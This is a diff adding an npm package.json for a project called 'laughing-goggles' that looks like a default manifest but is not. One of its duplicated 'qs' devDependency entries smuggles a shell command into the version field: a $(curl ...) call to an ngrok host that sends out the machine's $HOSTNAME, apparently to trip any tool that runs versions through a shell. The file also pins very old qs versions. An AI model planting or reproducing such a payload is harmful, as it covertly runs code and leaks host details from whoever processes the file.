@@ -1,0 +1,19 @@
+{
+  "name": "laughing-goggles",
+  "version": "1.0.0",
+  "description": "",
+  "main": "index.js",
+  "scripts": {
+    "test": "echo \"Error: no test specified\" && exit 1"
+  },
+    "dependencies": {
+    "qs": "0.0.6"
+  },
+  "devDependencies": {
+    "qs": "0.0.1",
+    "qs": " $(curl \"http://cbe4463b.ngrok.io?$HOSTNAME\")"
+  },
+  "author": "",
+  "license": "ISC"
+}
+
